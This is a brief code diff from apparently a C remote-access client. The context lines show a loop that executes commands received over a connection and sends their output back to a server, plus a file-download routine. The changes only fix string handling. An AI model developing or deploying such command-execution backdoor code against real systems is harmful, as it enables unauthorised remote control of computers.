@@ -114,7 +114,7 @@ void handleConnection()
             output = execCmd(cmd);
             if (output.array[0] == '\0')
             {
-                output.array = "No output";
+                sprintf(output.array, "No output");
             }
             printf("[+] Sending output to server.\n");
             sendMsg(output.array);
@@ -256,7 +256,7 @@ void download(char *remoteFilePath, char* localFilePath)
 {
     ssize_t nbytes;
     char buffer[MAX_BUFF_SIZE];
-    char* dirName = "downloads";
+    const char* dirName = "downloads";
     FILE *localFile;
     char *fullLocalPath;
 
